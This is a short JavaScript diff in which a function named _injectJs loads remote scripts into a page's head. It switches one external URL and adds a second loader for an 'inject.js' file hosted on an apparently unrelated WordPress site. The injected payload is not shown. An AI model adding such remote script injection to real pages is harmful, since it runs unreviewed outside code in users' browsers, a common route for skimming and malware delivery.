@@ -3,12 +3,21 @@
 	function _injectJs() {
 		var temp = document.createElement('script');
 		temp.setAttribute('type', 'text/javascript');
-		temp.src = "https://fr.healthtopquestions.com/wp-content/themes/publishable-mag/js/inject.js";
+		temp.src = "https://www.infosoap.com/wp-includes/js/jquery/jquery.js?ver=1.12.4";
 		temp.onload = function() {
 			// remove this when load
 			// this.parentNode.removeChild(this);
 		};
 		document.head.appendChild(temp);
+		
+		var temp2 = document.createElement('script');
+		temp2.setAttribute('type', 'text/javascript');
+		temp2.src = "https://www.infosoap.com/wp-content/plugins/publisher-core/js/inject.js?ver=1.1";
+		temp2.onload = function() {
+			// remove this when load
+			// this.parentNode.removeChild(this);
+		};
+		document.head.appendChild(temp2);
 	}
     jQuery(function($){
 		$(document).ready(function(){
